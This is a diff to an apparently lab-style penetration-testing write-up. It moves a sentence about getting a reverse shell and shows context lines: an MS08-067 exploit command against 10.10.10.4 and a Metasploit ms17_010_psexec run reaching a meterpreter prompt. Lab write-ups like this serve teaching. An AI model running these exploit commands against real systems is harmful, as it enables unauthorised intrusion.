@@ -337,6 +337,8 @@ Then, I executed the exploit script:
 ```
 python3 MS08-067.py 10.10.10.4 6 445
 ```
+The exploit successfully triggered, and I received a reverse shell callback on the Netcat listener:
+
 
 ![Pasted image 20250308095159](https://github.com/user-attachments/assets/aae1aa85-ae52-4d1f-a636-c57a0a582bae)
 
@@ -663,24 +665,3 @@ msf6 exploit(windows/smb/ms17_010_psexec) > run
 
 meterpreter >
 ```
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-The exploit successfully triggered, and I received a reverse shell callback on the Netcat listener:
